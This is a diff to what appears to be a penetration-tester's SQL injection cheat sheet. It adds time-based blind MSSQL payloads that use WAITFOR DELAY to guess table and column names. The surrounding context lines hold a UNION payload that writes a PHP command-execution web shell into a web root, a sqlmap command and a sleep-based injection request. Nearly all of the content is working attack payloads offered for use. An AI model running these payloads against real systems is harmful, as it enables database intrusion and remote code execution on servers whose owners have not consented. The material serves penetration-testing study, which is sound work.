@@ -1114,6 +1114,13 @@ SELECT * FROM information_schema.tables
 # SQL Web Shell
 'UNION SELECT ("<?php echo passthru($_GET['cmd'];") INTO OUTFILE 'C:/xampp/htdocs/command.php'>) #MedJed
 
+# Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)
+' IF (1=1) WAITFOR DELAY '0:0:10';--  #Evaluates to true and waits 10 secs
+
+' IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--  #This query uses Boolean to guess the table name of a database
+
+' IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';-- #This query uses Boolean to guess the column name of a table
+
 # Post
 ./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
 [From Burp to confirm] POST /issue/checkByPriority?priority=Normal'+UNION+SELECT+sleep(5);+--+- HTTP/1.1
